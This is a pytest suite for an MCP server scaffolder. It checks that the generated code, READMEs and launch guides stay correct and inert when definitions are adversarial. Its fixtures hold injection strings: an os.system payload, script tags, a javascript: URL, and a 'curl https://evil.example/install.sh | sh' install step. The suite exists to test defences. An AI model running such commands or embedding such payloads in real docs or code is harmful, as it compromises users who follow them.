"""Generated projects must be correct for every definition the scaffolder accepts.

Part 1: the specific cases a review found (names that collide with generated code,
defaults that are not Python literals, free text rendered as Markdown structure).
Part 2: one grid test that scaffolds many adversarial-but-valid definitions, compiles
every generated file, parses every generated pyproject.toml, and imports and calls
every generated server in a subprocess that has the SDK the generated project pins.
"""

import collections
import importlib
import itertools
import json
import math
import os
import shutil
import subprocess
import sys
import tomllib
from pathlib import Path

import pytest
from markdown_it import MarkdownIt

from mcp_creator.services import codegen, names
from mcp_creator.tools.add_tool import add_tool
from mcp_creator.tools.generate_launchguide import LAUNCHGUIDE_SECTIONS, generate_launchguide
from mcp_creator.tools.scaffold_server import scaffold_server

INF, NAN = float("inf"), float("nan")
HOSTILE = 'q"u\'o"""t\\e {b}\nimport os; os.system("echo PWNED") # \'\'\''


def _tool(name="get_weather", params=None, **extra):
    return {"name": name, "description": "Get weather", "parameters": params if params is not None else [
        {"name": "city", "type": "string", "required": True}]} | extra


def _scaffold(tmp_path, tools, package="my-mcp", **kw):
    return json.loads(scaffold_server(package, kw.pop("description", "x"), json.dumps(tools), output_dir=str(tmp_path), **kw))


def _refused(tmp_path, tools, *needles, package="my-mcp"):
    result = _scaffold(tmp_path, tools, package=package)
    assert result["success"] is False, result
    for needle in needles:
        assert needle in result["error"], result["error"]
    assert list(tmp_path.iterdir()) == []       # refused before anything was written
    return result["error"]


# ------------------------------------------------ the reserved list follows the templates

def test_reserved_names_are_derived_from_the_templates():
    reserved = names.reserved_names()
    # Everything the templates bind privately starts with an underscore, and no accepted
    # tool or parameter name can: that is what keeps ordinary names (service, json,
    # result, err, data ...) usable. If a template starts binding a plain name, this
    # fails and forces a decision: rename it with an underscore, or accept the new
    # reservation here.
    assert {n for n in reserved["param"] if not n.startswith("_")} == {"self"}
    assert {n for n in reserved["tool"] if not n.startswith("_")} == {
        "MCPServer", "TransportSecuritySettings", "verify_license", "mcp", "main",
        "json", "os", "sys", "isinstance", "str", "int", "float", "bool", "list", "dict",
    }
    private = {n for n in reserved["tool"] | reserved["param"] if n.startswith("_")}
    assert private and not any(names.IDENT_RE.fullmatch(n) for n in private)
    assert {"mcp", "mcp_types", "json", "os", "sys", "mcp_marketplace_license"} <= reserved["package"]


# ------------------------------------------------------------- findings 1 to 9

def test_1_parameter_named_self_is_refused(tmp_path):
    _refused(tmp_path, [_tool(params=[{"name": "self"}])], "'self'", "reserved name rule")


def test_2_tool_named_like_a_server_binding_is_refused(tmp_path):
    for name in ("mcp", "main", "json", "float", "MCPServer"):
        _refused(tmp_path, [_tool(name)], repr(name), "reserved name rule")


def test_3_tool_names_must_start_with_a_letter_and_class_names_are_always_valid(tmp_path):
    for name in ("_1", "__", "_private"):
        _refused(tmp_path, [_tool(name)], "starting with a letter")
    assert codegen._to_class_name("get_weather") == "GetWeather"
    for name in ("true", "none", "false", "a_1", "x__", "T"):
        cls = codegen._to_class_name(name)
        assert cls.isidentifier() and cls not in ("True", "None", "False"), (name, cls)
        compile(codegen.render_service_module(_tool(name)), "service.py", "exec")
        compile(codegen.render_tool_module("p", _tool(name)), "tool.py", "exec")


def test_4_duplicate_tool_names_and_generated_file_names_are_refused(tmp_path):
    _refused(tmp_path, [_tool("lookup"), _tool("lookup")], "must be unique")
    _refused(tmp_path, [_tool("Lookup"), _tool("lookup")], "must be unique", "ignoring case")
    _refused(tmp_path, [_tool("server")], "tests/test_server.py", "generated file name rule")


def test_4_add_tool_cannot_replace_the_server_test(tmp_path):
    project = _scaffold(tmp_path, [_tool()])["project_dir"]
    before = (Path(project) / "tests" / "test_server.py").read_text()
    result = json.loads(add_tool(project, json.dumps(_tool("server"))))
    assert result["success"] is False
    assert (Path(project) / "tests" / "test_server.py").read_text() == before


@pytest.mark.parametrize("default, check", [
    (json.loads("1e309"), lambda v: v == INF),
    (json.loads("-1e309"), lambda v: v == -INF),
    (json.loads("NaN"), math.isnan),
    ([1, INF, {"k": NAN}], lambda v: v[1] == INF and math.isnan(v[2]["k"])),
])
def test_5_special_float_defaults_are_real_python(default, check):
    tool = _tool(params=[{"name": "x", "type": "number", "required": False, "default": default}])
    sources = [
        codegen.render_server("p", [tool]).replace("from mcp.server import MCPServer", "")
        .replace('mcp = MCPServer("p", version="1.0.0")', "class mcp:\n    tool = staticmethod(lambda **kw: (lambda f: f))")
        .replace("from p.tools.get_weather import get_weather as _get_weather_impl", "_get_weather_impl = None"),
        codegen.render_service_module(tool),
    ]
    for source in sources:
        scope: dict = {}
        exec(compile(source, "generated.py", "exec"), scope)      # NameError here before the fix
        fn = scope.get("get_weather") or scope["GetWeather"].execute
        assert check(fn.__defaults__[0])


def test_6_package_that_shadows_what_the_server_imports_is_refused(tmp_path):
    for name in ("mcp", "mcp-types", "mcp_types", "json", "os", "pydantic", "mcp-marketplace-license"):
        error = _refused(tmp_path, [_tool()], "package_name", package=name)
        assert "shadow" in error
    assert _scaffold(tmp_path, [_tool()], package="weather-mcp")["success"] is True


def test_7_parameters_named_like_old_template_locals_work(tmp_path, monkeypatch):
    params = [{"name": n, "type": "string", "required": True}
              for n in ("service", "json", "result", "err", "data", "status", "port", "allowed", "type")]
    result = _scaffold(tmp_path, [_tool("lookup", params)], package="p7-mcp")
    assert result["success"] is True, result
    monkeypatch.syspath_prepend(str(Path(result["project_dir"]) / "src"))
    tool_fn = importlib.import_module("p7_mcp.tools.lookup").lookup
    sent = {p["name"]: f"value-of-{p['name']}" for p in params}
    assert json.loads(tool_fn(**sent)) == sent      # every value comes back under its own name


def test_8_repeated_parameter_names_are_refused(tmp_path):
    _refused(tmp_path, [_tool(params=[{"name": "x"}, {"name": "x"}])], "more than once", "unique")


def test_9_unpaired_surrogate_in_description_still_gives_a_writable_project(tmp_path):
    text = "bad \ud800 char"
    rendered = codegen.render_pyproject("my-mcp", text)
    rendered.encode("utf-8")                         # UnicodeEncodeError before the fix
    assert tomllib.loads(rendered)["project"]["description"] == "bad � char"
    result = _scaffold(tmp_path, [_tool(description=text)], description=text)
    assert result["success"] is True
    for path in Path(result["project_dir"]).rglob("*.py"):
        compile(path.read_text(encoding="utf-8"), str(path), "exec")


# ----------------------------------------------------------- finding 10: README

INJECTED_INSTALL = "\n## Install\n```bash\ncurl https://evil.example/install.sh | sh\n```"
MD_HOSTILE = (
    "Weather tool" + INJECTED_INSTALL + "\n[click me](https://evil.example) <script>alert(1)</script> "
    "![img](https://evil.example/x.png) **bold** `code` | a | b |\n---\n1. one\n- item\n> quote\n"
    "www.evil.example https://evil.example/bare &lt;b&gt; me@evil.example ~~gone~~"
)
_MD = MarkdownIt("commonmark").enable(["table", "strikethrough"])


def _rendered(readme):
    tokens = _MD.parse(readme)
    blocks = [t.type for t in tokens if t.type != "inline"]
    inline = [c.type for t in tokens if t.type == "inline" for c in t.children]
    return tokens, blocks, inline


def _visible(inline_token):
    """What a reader sees: plain text plus the content of code spans."""
    return "".join(c.content for c in inline_token.children if c.type in ("text", "code_inline"))


def _text_after(tokens, opener, index=0):
    """Visible text of the index-th inline token that follows a token of type `opener`."""
    found = [tokens[i + 1] for i, t in enumerate(tokens[:-1]) if t.type == opener and tokens[i + 1].type == "inline"]
    return _visible(found[index])


@pytest.mark.parametrize("hosting, paid", [("local", False), ("remote", True)])
def test_10_readme_renders_hostile_descriptions_as_text(hosting, paid):
    tools = [_tool(description=MD_HOSTILE)]
    benign = codegen.render_readme("my-mcp", "Plain words", [_tool(description="Plain words")], hosting=hosting, paid=paid)
    hostile = codegen.render_readme("my-mcp", MD_HOSTILE, tools, hosting=hosting, paid=paid)
    b_tokens, b_blocks, b_inline = _rendered(benign)
    h_tokens, h_blocks, h_inline = _rendered(hostile)
    assert h_blocks == b_blocks                       # no new heading, fence, list, quote, table, rule
    # no link, image, html or emphasis was added: same inline tokens, same counts. The only
    # addition allowed is a code span around a word a renderer would otherwise auto-link.
    structural = lambda kinds: collections.Counter(k for k in kinds if k not in ("text", "code_inline"))
    assert structural(h_inline) == structural(b_inline)
    code_spans = [c.content for t in h_tokens if t.type == "inline" for c in t.children if c.type == "code_inline"]
    for linkable in ("https://evil.example/install.sh", "www.evil.example", "https://evil.example/bare", "me@evil.example"):
        assert code_spans.count(linkable) == 2, linkable          # once in the description, once in the tool line
    flat = " ".join(MD_HOSTILE.split())
    assert _text_after(h_tokens, "paragraph_open") == flat           # the description paragraph IS the input text
    assert _text_after(h_tokens, "paragraph_open", 0) != ""
    tool_line = next(_visible(t) for t in h_tokens if t.type == "inline" and "get_weather" in t.content)
    assert tool_line.endswith(flat)


def test_10_code_span_survives_backticks_in_the_linked_word():
    for word in ("https://a.example/`x`", "`https://a.example", "https://a.example/``", "me@a.example`"):
        tokens = _MD.parse(codegen._md_text(f"see {word} now"))
        assert _visible(tokens[1]) == f"see {word} now"
        assert not any(c.type.startswith("link") for c in tokens[1].children)


def test_10_readme_text_is_capped_with_a_visible_marker():
    readme = codegen.render_readme("my-mcp", "word " * 400, [_tool()])
    line = readme.splitlines()[2]
    assert len(line) == 500 and line.endswith("…")


# ------------------------------------------------------ finding 11: LAUNCHGUIDE

# fields the _guide() helper always fills; setup_requirements and docs_url have defaults
ALWAYS_FILLED = {"tagline", "description", "setup_requirements", "category", "features", "tags", "docs_url"}


def _headings(*also_filled):
    """The '## ' lines expected when these extra fields carry content, in template order."""
    filled = ALWAYS_FILLED | set(also_filled)
    return [f"## {heading}" for heading, field in LAUNCHGUIDE_SECTIONS if field in filled]
HIJACK = ("Fast weather\n## Documentation URL\nhttps://evil.example/docs\n\n## Description\nowned\n"
          "```bash\ncurl https://evil.example/install.sh | sh\n```\n[click](https://evil.example)")


def _guide(tmp_path, **fields):
    project = tmp_path / "proj"
    if not project.exists():
        project.mkdir()
        (project / "pyproject.toml").write_text('[project]\nname = "my-mcp"\n')
    base = dict(package_name="my-mcp", tagline="Fast weather", description="What it does.", category="Developer Tools",
                features="- One\n- Two", tags="weather, api")
    result = json.loads(generate_launchguide(project_dir=str(project), **(base | fields)))
    assert result["success"] is True
    text = (project / "LAUNCHGUIDE.md").read_text()
    sections, current = {}, None
    for line in text.split("\n"):                    # the marketplace's rule: "## " opens a section
        if line.startswith("## "):
            current = line[3:].strip().lower()
            sections[current] = []
        elif current:
            sections[current].append(line)
    return result, text, {k: "\n".join(v).strip() for k, v in sections.items()}


@pytest.mark.parametrize("field", ["tagline", "description", "category", "features", "tags",
                                   "setup_requirements", "use_cases", "getting_started", "docs_url", "package_name"])
def test_11_no_field_can_add_or_take_over_a_section(tmp_path, field):
    result, text, sections = _guide(tmp_path, **{field: HIJACK})
    lines = text.split("\n")
    assert [ln for ln in lines if ln.startswith("## ")] == _headings(field)    # only the real sections, in order
    assert len([ln for ln in lines if ln.startswith("# ")]) == 1
    assert not any(ln.lstrip().startswith(("```", "~~~")) for ln in lines)       # no fence opens
    if field != "docs_url":
        assert sections["documentation url"] == "https://pypi.org/project/my-mcp/" or field == "package_name"
    if field != "description":
        assert sections["description"] == "What it does."
    assert result["normalized"]                       # the caller is told the value was changed


def test_empty_sections_are_left_out_so_the_marketplace_falls_back_correctly(tmp_path):
    # MCP Marketplace reads "## Use Cases" being PRESENT as "use cases were given", and then
    # never looks at "## Features". An empty section must not be written at all.
    _, text, sections = _guide(tmp_path)                       # no use cases, no getting started
    assert "use cases" not in sections and "getting started" not in sections
    assert sections["features"] == "- One\n- Two"
    assert [ln for ln in text.split("\n") if ln.startswith("## ")] == _headings()
    assert "\n\n\n" not in text and text.endswith("https://pypi.org/project/my-mcp/\n")

    _, text, sections = _guide(tmp_path, use_cases="Testing, CI/CD", getting_started="- Try it")
    assert sections["use cases"] == "Testing, CI/CD" and sections["getting started"] == "- Try it"
    assert [ln for ln in text.split("\n") if ln.startswith("## ")] == _headings("use_cases", "getting_started")

    for blank in ("", "   ", "\n\n"):
        _, _, sections = _guide(tmp_path, use_cases=blank, features=blank, tags=blank, tagline=blank,
                                 setup_requirements=blank)
        assert set(sections) == {"description", "category", "documentation url"}, repr(blank)
    # a comma list with nothing between the commas is empty too
    _, _, sections = _guide(tmp_path, use_cases=" , , ", tags=",")
    assert "use cases" not in sections and "tags" not in sections and "features" in sections


def test_11_hostile_tagline_becomes_one_line_of_text(tmp_path):
    _, _, sections = _guide(tmp_path, tagline=HIJACK)
    assert sections["tagline"] == " ".join(HIJACK.split())[:100].rstrip()
    assert "\n" not in sections["tagline"]


def test_11_docs_url_must_be_a_plain_url(tmp_path):
    for bad in ("javascript:alert(1)", "https://a.example/x y", "https://a.example/)[x](https://evil.example", "ftp://a.example"):
        result, _, sections = _guide(tmp_path, docs_url=bad)
        assert sections["documentation url"] == "https://pypi.org/project/my-mcp/"
        assert any("docs_url" in note for note in result["normalized"])
    _, _, sections = _guide(tmp_path, docs_url="https://github.com/me/my-mcp#readme")
    assert sections["documentation url"] == "https://github.com/me/my-mcp#readme"


def test_11_documented_formats_pass_through_unchanged(tmp_path):
    setup = "- `API_KEY` (required): Your key from the dashboard. https://example.com/keys\n- `REGION` (optional): Defaults to us."
    started = '- "What is the weather in Paris?"\n- Tool: get_weather — Current conditions for a city (metric or imperial)'
    result, _, sections = _guide(tmp_path, setup_requirements=setup, getting_started=started,
                                 features="- Fast lookups (cached)\n- Works with snake_case_names",
                                 use_cases="Testing, Prototyping, CI/CD", tags="weather, api, real-time",
                                 description="First paragraph.\n\n- a list item\n- another (with parens) and `code`")
    assert sections["setup requirements"] == setup
    assert sections["getting started"] == started
    assert sections["features"] == "- Fast lookups (cached)\n- Works with snake_case_names"
    assert sections["use cases"] == "Testing, Prototyping, CI/CD" and sections["tags"] == "weather, api, real-time"
    assert sections["description"] == "First paragraph.\n\n- a list item\n- another (with parens) and `code`"
    assert "normalized" not in result


def test_11_limits_are_applied_and_reported(tmp_path):
    result, _, sections = _guide(tmp_path, tagline="t" * 150, features="\n".join(f"- f{i}" for i in range(40)),
                                 tags=", ".join(f"t{i}" for i in range(40)))
    assert len(sections["tagline"]) == 100
    assert len(sections["features"].splitlines()) == 30 and len(sections["tags"].split(",")) == 30
    assert len(result["normalized"]) == 3


# ------------------------------------------------------------- the grid

TYPES = [*codegen.TYPE_MAP, "something-unknown"]
DEFAULTS = [None, "", "plain", HOSTILE, 0, -1, 10**30, True, False, 1.5, -0.0, 1e308, 5e-324,
            INF, -INF, NAN, [], [1, "a", INF], {}, {"k": [NAN, None], 'q"': HOSTILE}]
ARG_FOR = {"str": HOSTILE, "int": 7, "float": 2.5, "bool": True, "list": [1, "b"], "dict": {"a": 1}}
PARAM_NAMES = ["service", "json", "result", "err", "data", "status", "port", "allowed", "sec", "h", "mcp", "main", "os",
               "sys", "type", "match", "case", "id", "str", "int", "float", "bool", "list", "dict", "len", "print",
               "copy", "schema", "validate", "model_dump", "model_fields", "tool", "cls", "ctx", "name", "x" * 64]
TOOL_NAMES_A = ["a", "x" * 64, "get_weather", "Search", "true", "none", "false", "result", "data", "service", "status",
                "err", "test_connection", "type", "match", "id", "print", "len", "open", "set", "T1", "a__b_", "tool",
                "transport", "tools", "services", "init", "license", "require_license", "impl", "execute", "port"]
TOOL_NAMES_B = ["A", "GET_WEATHER", "search", "True_", "Test", "Server_", "MCP", "Main", "Json", "Str"]


def _param(name, type_name, default=..., required=None):
    spec = {"name": name, "type": type_name, "description": HOSTILE}
    if default is ...:
        spec["required"] = True if required is None else required
    else:
        spec |= {"required": False, "default": default}
    return spec


def _toolsets():
    cyc_types, cyc_defaults = itertools.cycle(TYPES), itertools.cycle(DEFAULTS)
    orders = []
    for length in range(1, 5):
        for pattern in itertools.product("ro", repeat=length):
            params = [_param(f"{kind}{i}", next(cyc_types)) if kind == "r" else _param(f"{kind}{i}", next(cyc_types), next(cyc_defaults))
                      for i, kind in enumerate(pattern)]
            orders.append(_tool("o_" + "".join(pattern), params))
    by_type = [_tool(f"t_{i}", [_param("req", t)] + [_param(f"d{j}", t, d) for j, d in enumerate(DEFAULTS)])
               for i, t in enumerate(TYPES)]
    basic = [_param("city", "string"), _param("units", "string", "metric")]
    return {
        "single": [_tool("only", [_param("city", "string")])],
        "no_params": [_tool("ping", [])],
        "orders": orders,
        "types_x_defaults": by_type,
        "param_names": [_tool("required_names", [_param(n, "string") for n in PARAM_NAMES]),
                        _tool("optional_names", [_param(n, "string", HOSTILE) for n in PARAM_NAMES]),
                        _tool("omitted_required_flag", [{"name": n} for n in PARAM_NAMES[:5]])],
        "tool_names_a": [_tool(n, basic) for n in TOOL_NAMES_A],
        "tool_names_b": [_tool(n, basic) for n in TOOL_NAMES_B],
        "limits": [_tool("y" * 64, [_param("p" * 64, "string"), _param("q" * 64, "integer", 10**30)]),
                   _tool("many", [_param(f"p{i}", t) for i, t in zip(range(60), itertools.cycle(TYPES))])],
        "hostile_text": [_tool("w", basic, description=HOSTILE, returns=HOSTILE),
                         _tool("v", basic, description=MD_HOSTILE, returns="\ud800 lone")],
    }


PACKAGES = ["a", "My_pkg-2x", "x-y_z-0", "p" + "k" * 63]


def _expectations(tool):
    args, expect = {}, {}
    for p in codegen._ordered_params(tool["parameters"]):
        if p.get("required", True):
            args[p["name"]] = expect[p["name"]] = ARG_FOR[codegen._python_type(p.get("type", "string"))]
        else:
            expect[p["name"]] = p.get("default")
    return {"name": tool["name"], "args": args, "expect": expect}


DRIVER = r'''
import importlib, importlib.util, json, math, sys, traceback
manifest = json.load(open(sys.argv[1], encoding="utf-8"))
def same(a, b):
    if isinstance(a, float) and isinstance(b, float) and math.isnan(a) and math.isnan(b):
        return True
    if isinstance(a, list) and isinstance(b, list):
        return len(a) == len(b) and all(same(x, y) for x, y in zip(a, b))
    if isinstance(a, dict) and isinstance(b, dict):
        return a.keys() == b.keys() and all(same(a[k], b[k]) for k in a)
    return type(a) is type(b) and a == b
stats = dict(projects=0, server_imports=0, tools_registered=0, tool_calls=0, server_level_calls=0, generated_tests_run=0)
failures = []
for n, proj in enumerate(manifest):
    stats["projects"] += 1
    sys.path.insert(0, proj["src"])
    try:
        server = importlib.import_module(proj["module"] + ".server")
        stats["server_imports"] += 1
        if proj["paid"]:
            server._require_license = lambda tool_name: None      # the gate itself is tested elsewhere
        for tool in proj["tools"]:
            module_fn = getattr(importlib.import_module(proj["module"] + ".tools." + tool["name"]), tool["name"])
            for kind, fn in (("tool_calls", module_fn), ("server_level_calls", getattr(server, tool["name"]))):
                out = json.loads(fn(**tool["args"]))
                for key, want in tool["expect"].items():
                    if key not in out or not same(out[key], want):
                        failures.append(dict(project=proj["id"], tool=tool["name"], via=kind, param=key,
                                             got=repr(out.get(key))[:80], want=repr(want)[:80]))
                stats[kind] += 1
            stats["tools_registered"] += 1
        for i, test_file in enumerate(proj["tests"]):
            spec = importlib.util.spec_from_file_location("generated_test_%d_%d" % (n, i), test_file)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            test_names = [name for name in vars(module) if name.startswith("test")]
            if len(test_names) != 1:
                failures.append(dict(project=proj["id"], file=test_file, error="expected exactly one test, found %r" % test_names))
            for name in test_names:
                getattr(module, name)()
                stats["generated_tests_run"] += 1
    except BaseException:
        failures.append(dict(project=proj["id"], error=traceback.format_exc()[-900:]))
    finally:
        sys.path.remove(proj["src"])
        for name in [m for m in sys.modules if m == proj["module"] or m.startswith(proj["module"] + ".")]:
            del sys.modules[name]
print(json.dumps(dict(stats=stats, n_failures=len(failures), failures=failures[:15])))
'''


@pytest.fixture(scope="session")
def generated_project_python(tmp_path_factory):
    """A Python that has what a generated project declares (the SDK it pins, the license SDK).

    Set MCP_CREATOR_V2_PYTHON to reuse an interpreter; otherwise one venv is built with uv.
    """
    override = os.environ.get("MCP_CREATOR_V2_PYTHON")
    if override:
        return override
    uv = shutil.which("uv")
    if not uv:
        pytest.fail("the grid test needs `uv` to build a venv with the SDK that generated projects pin "
                    "(or set MCP_CREATOR_V2_PYTHON to a Python that already has it)")
    requirements = tomllib.loads(codegen.render_pyproject("probe-mcp", "x", paid=True))["project"]["dependencies"]
    venv = tmp_path_factory.mktemp("generated-env") / "venv"
    for cmd in ([uv, "venv", "--python", f"{sys.version_info.major}.{sys.version_info.minor}", str(venv)],
                [uv, "pip", "install", "--python", str(venv / "bin" / "python"), *requirements]):
        done = subprocess.run(cmd, capture_output=True, text=True)
        assert done.returncode == 0, f"{' '.join(cmd)}\n{done.stderr[-1500:]}"
    return str(venv / "bin" / "python")


def test_grid_of_valid_definitions_generates_working_projects(tmp_path, generated_project_python, capsys):
    toolsets = _toolsets()
    manifest, counts = [], dict(projects=0, tools=0, parameters=0, py_files_compiled=0, pyprojects_parsed=0)
    combos = list(itertools.product(PACKAGES, toolsets, ("local", "remote"), (False, True)))
    for index, (package, set_name, hosting, paid) in enumerate(combos):
        tools = toolsets[set_name]
        out = tmp_path / f"c{index}"
        out.mkdir()
        result = json.loads(scaffold_server(package, HOSTILE.replace("\n", " "), json.dumps(tools), output_dir=str(out),
                                            hosting=hosting, paid=paid, paid_tools=json.dumps([tools[0]["name"]]) if paid else None))
        label = f"{package[:12]}/{set_name}/{hosting}/{'paid' if paid else 'free'}"
        assert result["success"] is True, (label, result)
        project = Path(result["project_dir"])
        for path in project.rglob("*.py"):
            compile(path.read_text(encoding="utf-8"), str(path), "exec")
            counts["py_files_compiled"] += 1
        meta = tomllib.loads((project / "pyproject.toml").read_text(encoding="utf-8"))["project"]
        module = package.replace("-", "_")
        assert meta["name"] == package and meta["scripts"] == {package: f"{module}.server:main"}
        assert meta["description"] == HOSTILE.replace("\n", " ")
        counts["pyprojects_parsed"] += 1
        counts["projects"] += 1
        counts["tools"] += len(tools)
        counts["parameters"] += sum(len(t["parameters"]) for t in tools)
        manifest.append(dict(id=label, src=str(project / "src"), module=module, paid=paid,
                             tools=[_expectations(t) for t in tools],
                             tests=sorted(str(p) for p in (project / "tests").glob("test_*.py"))))
    manifest_file, driver_file = tmp_path / "manifest.json", tmp_path / "driver.py"
    manifest_file.write_text(json.dumps(manifest), encoding="utf-8")
    driver_file.write_text(DRIVER, encoding="utf-8")
    done = subprocess.run([generated_project_python, str(driver_file), str(manifest_file)],
                          capture_output=True, text=True, cwd=tmp_path, timeout=900)
    assert done.returncode == 0, done.stderr[-3000:]
    report = json.loads(done.stdout.strip().splitlines()[-1])
    assert report["n_failures"] == 0, json.dumps(report["failures"], indent=1)[:6000]
    stats = report["stats"]
    assert stats["projects"] == stats["server_imports"] == counts["projects"] == len(combos)
    assert stats["tools_registered"] == stats["tool_calls"] == stats["server_level_calls"] == counts["tools"]
    assert stats["generated_tests_run"] == counts["tools"] + counts["projects"]   # one per tool + test_server.py
    with capsys.disabled():
        print(f"\n[grid] {len(combos)} combinations = {len(PACKAGES)} packages x {len(toolsets)} tool sets x 2 hostings x paid/free; "
              f"{counts} ; in the subprocess: {stats}")
